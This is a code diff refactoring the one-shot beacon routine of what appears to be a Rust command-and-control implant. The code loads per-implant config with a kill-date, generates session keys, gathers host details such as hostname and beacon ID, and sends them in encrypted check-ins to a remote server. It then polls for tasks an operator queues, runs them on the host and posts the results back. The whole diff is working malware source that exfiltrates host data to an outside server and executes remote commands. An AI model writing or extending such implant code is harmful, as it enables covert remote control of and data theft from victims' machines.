@@ -469,6 +469,51 @@ pub unsafe fn beacon_loop() -> u32 {
 ///   0xC0..0xCF = a specific step failed (see inline comments)
 #[allow(unused_assignments)]
 pub unsafe fn beacon_oneshot() -> u32 {
+    let (cfg, implant) = match beacon_oneshot_load() {
+        Ok(c) => c,
+        Err(code) => return code,
+    };
+    // DIAG step 1: config loaded OK
+    crate::entry::diag_mark(b"b1_config");
+
+    // Initialize channel dispatcher (same as beacon_loop).
+    let ch_ctx = crate::channels::ChannelCtx::from_config(&cfg);
+    crate::channels::set_active(crate::channels::Channel::from_u8(cfg.primary_channel));
+    crate::entry::diag_mark(b"b2_channel");
+
+    let (key, pubkey) = match beacon_oneshot_keygen(&cfg, &implant) {
+        Ok(k) => k,
+        Err(code) => return code,
+    };
+    let info_plain = match beacon_oneshot_sessioninfo(&implant) {
+        Ok(plain) => plain,
+        Err(code) => return code,
+    };
+    let rt = crate::syscalls::global();
+    crate::entry::diag_mark(b"b5_info");
+
+    // ---- check-in (retry up to ~30s) ----
+    let mut counter = match beacon_oneshot_checkin(&pubkey, &key, &info_plain, &ch_ctx) {
+        Ok(c) => c,
+        Err(code) => return code,
+    };
+
+    // ---- poll for tasks (a few short cycles to give the operator time to
+    // queue one via POST /api/task) ----
+    let Some(tasks) = (match beacon_oneshot_poll(&pubkey, &mut counter, &key, &ch_ctx) {
+        Ok(t) => t,
+        Err(code) => return code,
+    }) else {
+        return 1;
+    };
+    beacon_oneshot_run_tasks(&pubkey, &mut counter, &key, &cfg, rt, &ch_ctx, tasks);
+    2
+}
+
+/// Load per-implant config (falling back to compile-time), register the
+/// plaintext with the memory mask, and enforce the fail-closed kill-date.
+/// Err(0x00) = kill-date reached — deliberate stop before check-in.
+fn beacon_oneshot_load() -> Result<(Config, ImplantConfig), u32> {
     // Try per-implant config first, fall back to compile-time (dev path).
     let (cfg, implant, config_plain) =
         if let Some((c, i, p)) = config_placeholder::load_runtime_config() {
@@ -482,16 +527,17 @@ pub unsafe fn beacon_oneshot() -> u32 {
     // past its expiry — mirrors beacon_loop's pre-check-in gate. Exit cleanly
     // with the loop's deliberate-stop code.
     if kill_date_reached(&implant) {
-        return 0x00;
+        return Err(0x00);
     }
-    // DIAG step 1: config loaded OK
-    crate::entry::diag_mark(b"b1_config");
+    Ok((cfg, implant))
+}
 
-    // Initialize channel dispatcher (same as beacon_loop).
-    let ch_ctx = crate::channels::ChannelCtx::from_config(&cfg);
-    crate::channels::set_active(crate::channels::Channel::from_u8(cfg.primary_channel));
-    crate::entry::diag_mark(b"b2_channel");
-
+/// Per-implant keypair + session key, registered with the memory mask.
+/// Err(code) = the caller's exit code (0xAF CSPRNG, 0xB0 key exchange).
+fn beacon_oneshot_keygen(
+    cfg: &Config,
+    implant: &ImplantConfig,
+) -> Result<(nyx_protocol::crypto::SessionKey, [u8; 32]), u32> {
     let kp = if let Some(ref priv_bytes) = implant.implant_priv {
         ImplantKeypair::from_secret_bytes(*priv_bytes)
     } else {
@@ -499,7 +545,7 @@ pub unsafe fn beacon_oneshot() -> u32 {
             Ok(k) => k,
             Err(_) => {
                 crate::entry::diag_mark(b"ERR_ONESHOT_CSPRNG");
-                return 0xAF; // CSPRNG failure exit code
+                return Err(0xAF); // CSPRNG failure exit code
             }
         }
     };
@@ -509,14 +555,19 @@ pub unsafe fn beacon_oneshot() -> u32 {
         Ok(k) => k,
         Err(_) => {
             crate::entry::diag_mark(b"ERR_ONESHOT_KEYEXCH");
-            return 0xB0; // non-contributory key exchange failure exit code
+            return Err(0xB0); // non-contributory key exchange failure exit code
         }
     };
     // DIAG step 3: session_key (HKDF) done
     crate::entry::diag_mark(b"b4_skey");
     crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
+    Ok((key, pubkey))
+}
 
+/// Real host enumeration → encoded SessionInfo plaintext.
+/// Err(code) = the caller's exit code (0xC2 encode failed).
+fn beacon_oneshot_sessioninfo(implant: &ImplantConfig) -> Result<Vec<u8>, u32> {
     let info = SessionInfo {
         beacon_id: crate::hostinfo::beacon_id(),
         hostname: crate::hostinfo::hostname(),
@@ -533,28 +584,35 @@ pub unsafe fn beacon_oneshot() -> u32 {
     // effectively unreachable, but panic=abort makes a bare expect fatal.
     if info.encode(&mut info_writer).is_err() {
         crate::entry::diag_mark(b"ERR_ONESHOT_SESSIONINFO");
-        return 0xC2; // SessionInfo encode failed (malformed Writer state)
+        return Err(0xC2); // SessionInfo encode failed (malformed Writer state)
     }
-    let info_plain = info_writer.into_bytes();
-    let rt = crate::syscalls::global();
-    crate::entry::diag_mark(b"b5_info");
+    Ok(info_writer.into_bytes())
+}
 
-    // ---- check-in (retry up to ~30s) ----
+/// Check-in retry loop (up to ~30s). Returns the next frame counter on success.
+/// Err(code) = the caller's exit code (0xC3 seal, 0xC1 check-in failed).
+fn beacon_oneshot_checkin(
+    pubkey: &[u8; 32],
+    key: &nyx_protocol::crypto::SessionKey,
+    info_plain: &[u8],
+    ch_ctx: &crate::channels::ChannelCtx,
+) -> Result<u64, u32> {
     let mut counter = 0u64;
     let mut checked_in = false;
     for _ in 0..10 {
-        let frame = match encode_frame_dir(&pubkey, Direction::ClientToServer, counter, &key, &info_plain) {
+        let frame = match encode_frame_dir(pubkey, Direction::ClientToServer, counter, key, info_plain)
+        {
             Ok(f) => f,
             Err(_) => {
                 crate::entry::diag_mark(b"ERR_ONESHOT_SEAL_CHECKIN");
-                return 0xC3; // check-in frame seal failed (AEAD alloc failure)
+                return Err(0xC3); // check-in frame seal failed (AEAD alloc failure)
             }
         };
         counter += 1;
         crate::entry::diag_mark(b"b6_send");
         if unsafe {
             crate::channels::dispatch_send_recv(
-                &ch_ctx,
+                ch_ctx,
                 crate::channels::get_active(),
                 &frame,
             )
@@ -568,40 +626,32 @@ pub unsafe fn beacon_oneshot() -> u32 {
         sleep_jitter(3, 0);
     }
     if !checked_in {
-        return 0xC1; // check-in failed (server unreachable / crypto mismatch)
+        return Err(0xC1); // check-in failed (server unreachable / crypto mismatch)
     }
+    Ok(counter)
+}
 
-    // ---- poll for tasks (a few short cycles to give the operator time to
-    // queue one via POST /api/task) ----
-    let mut got_task = false;
+/// Poll for queued tasks (up to 6 short cycles). Returns Some(tasks) when a
+/// non-empty batch arrives, None when the poll window is exhausted.
+/// Err(code) = the caller's exit code (0xC3 seal failed).
+fn beacon_oneshot_poll(
+    pubkey: &[u8; 32],
+    counter: &mut u64,
+    key: &nyx_protocol::crypto::SessionKey,
+    ch_ctx: &crate::channels::ChannelCtx,
+) -> Result<Option<Vec<Task>>, u32> {
     for _ in 0..6 {
         crate::entry::diag_mark(b"b7a_before_sleep");
         sleep_jitter(2, 0);
         crate::entry::diag_mark(b"b7b_after_sleep");
-        // POST empty batch, receive any queued tasks. An empty batch has no
-        // blobs, so encode_vec cannot hit MAX_BLOB_LEN — but use unwrap_or_default
-        // so a malformed Writer state never aborts the beacon (P0-4).
-        let frame = match encode_frame_dir(
-            &pubkey,
-            Direction::ClientToServer,
-            counter,
-            &key,
-            &TaskResponse::encode_vec(&[]).unwrap_or_default(),
-        ) {
+        let frame = match beacon_oneshot_poll_frame(pubkey, counter, key) {
             Ok(f) => f,
-            Err(_) => {
-                crate::entry::diag_mark(b"ERR_ONESHOT_SEAL_POLL");
-                return 0xC3; // poll frame seal failed (AEAD alloc failure)
-            }
+            Err(code) => return Err(code),
         };
-        counter += 1;
+        *counter += 1;
         crate::entry::diag_mark(b"b8_poll");
         let body = unsafe {
-            crate::channels::dispatch_send_recv(
-                &ch_ctx,
-                crate::channels::get_active(),
-                &frame,
-            )
+            crate::channels::dispatch_send_recv(ch_ctx, crate::channels::get_active(), &frame)
         };
         let Some(body) = body else {
             continue;
@@ -614,7 +664,7 @@ pub unsafe fn beacon_oneshot() -> u32 {
         if !accept_server_counter(raw.counter) {
             continue;
         }
-        let Ok(plaintext) = open_frame_dir(&key, Direction::ServerToClient, &raw) else {
+        let Ok(plaintext) = open_frame_dir(key, Direction::ServerToClient, &raw) else {
             continue;
         };
         let Ok(tasks) = Task::decode_vec(&plaintext) else {
@@ -624,53 +674,98 @@ pub unsafe fn beacon_oneshot() -> u32 {
         if tasks.is_empty() {
             continue; // no task queued yet, keep polling
         }
-        got_task = true;
-        // Execute + POST results back (one cycle, then we're done).
-        let mut pending: Vec<TaskResponse> = Vec::new();
-        for t in tasks {
-            if matches!(t.command, Command::Exit) {
-                break;
-            }
-            for response in execute(rt, t.command, &mut counter, &pubkey, &key, &cfg) {
-                pending.push(TaskResponse {
-                    task_id: t.task_id,
-                    response,
-                });
-            }
-        }
-        if !pending.is_empty() {
-            // P0-4: encode_batch swaps any oversized Response for an Err so the
-            // frame always encodes instead of aborting the beacon.
-            let rframe = match encode_frame_dir(&pubkey, Direction::ClientToServer, counter, &key, &encode_batch(&mut pending))
-            {
-                Ok(f) => f,
-                Err(_) => {
-                    crate::entry::diag_mark(b"ERR_ONESHOT_SEAL_FLUSH");
-                    // Keep `pending` (do not advance counter) so the responses
-                    // are retried — but oneshot exits after this cycle, so just
-                    // break out of the response loop.
-                    break;
-                }
-            };
-            let sent = unsafe {
-                crate::channels::dispatch_send_recv(
-                    &ch_ctx,
-                    crate::channels::get_active(),
-                    &rframe,
-                )
-            };
-            // P0-3: only advance the counter when the send actually succeeded,
-            // so a failed round-trip doesn't desync the sequence number.
-            if sent.is_some() {
-                counter += 1;
-            }
-        }
-        break;
+        return Ok(Some(tasks));
     }
-    if got_task {
-        2
-    } else {
-        1
+    Ok(None)
+}
+
+/// Seal the empty-batch poll frame. An empty batch has no blobs, so
+/// `encode_vec` cannot hit MAX_BLOB_LEN — but use `unwrap_or_default` so a
+/// malformed Writer state never aborts the beacon (P0-4). Err = exit code 0xC3.
+fn beacon_oneshot_poll_frame(
+    pubkey: &[u8; 32],
+    counter: &mut u64,
+    key: &nyx_protocol::crypto::SessionKey,
+) -> Result<Vec<u8>, u32> {
+    // POST empty batch, receive any queued tasks. An empty batch has no
+    // blobs, so encode_vec cannot hit MAX_BLOB_LEN — but use unwrap_or_default
+    // so a malformed Writer state never aborts the beacon (P0-4).
+    match encode_frame_dir(
+        pubkey,
+        Direction::ClientToServer,
+        *counter,
+        key,
+        &TaskResponse::encode_vec(&[]).unwrap_or_default(),
+    ) {
+        Ok(f) => Ok(f),
+        Err(_) => {
+            crate::entry::diag_mark(b"ERR_ONESHOT_SEAL_POLL");
+            Err(0xC3) // poll frame seal failed (AEAD alloc failure)
+        }
+    }
+}
+
+/// Execute one batch of tasks and POST the responses back (single cycle).
+fn beacon_oneshot_run_tasks(
+    pubkey: &[u8; 32],
+    counter: &mut u64,
+    key: &nyx_protocol::crypto::SessionKey,
+    cfg: &Config,
+    rt: Option<&'static crate::syscalls::Runtime>,
+    ch_ctx: &crate::channels::ChannelCtx,
+    tasks: Vec<Task>,
+) {
+    // Execute + POST results back (one cycle, then we're done).
+    let mut pending: Vec<TaskResponse> = Vec::new();
+    for t in tasks {
+        if matches!(t.command, Command::Exit) {
+            break;
+        }
+        for response in execute(rt, t.command, counter, pubkey, key, cfg) {
+            pending.push(TaskResponse {
+                task_id: t.task_id,
+                response,
+            });
+        }
+    }
+    if !pending.is_empty() {
+        beacon_oneshot_flush(pubkey, counter, key, ch_ctx, &mut pending);
+    }
+}
+
+/// Seal + send the response batch; advance the counter only on success (P0-3).
+fn beacon_oneshot_flush(
+    pubkey: &[u8; 32],
+    counter: &mut u64,
+    key: &nyx_protocol::crypto::SessionKey,
+    ch_ctx: &crate::channels::ChannelCtx,
+    pending: &mut Vec<TaskResponse>,
+) {
+    // P0-4: encode_batch swaps any oversized Response for an Err so the
+    // frame always encodes instead of aborting the beacon.
+    let rframe = match encode_frame_dir(
+        pubkey,
+        Direction::ClientToServer,
+        *counter,
+        key,
+        &encode_batch(pending),
+    ) {
+        Ok(f) => f,
+        Err(_) => {
+            crate::entry::diag_mark(b"ERR_ONESHOT_SEAL_FLUSH");
+            // Keep `pending` (do not advance counter) so the responses
+            // are retried — but oneshot exits after this cycle, so just
+            // break out of the response loop.
+            return;
+        }
+    };
+    let sent = unsafe {
+        crate::channels::dispatch_send_recv(ch_ctx, crate::channels::get_active(), &rframe)
+    };
+    // P0-3: only advance the counter when the send actually succeeded,
+    // so a failed round-trip doesn't desync the sequence number.
+    if sent.is_some() {
+        *counter += 1;
     }
 }
 /// Encode a batch of [`TaskResponse`]s for the wire, gracefully handling an
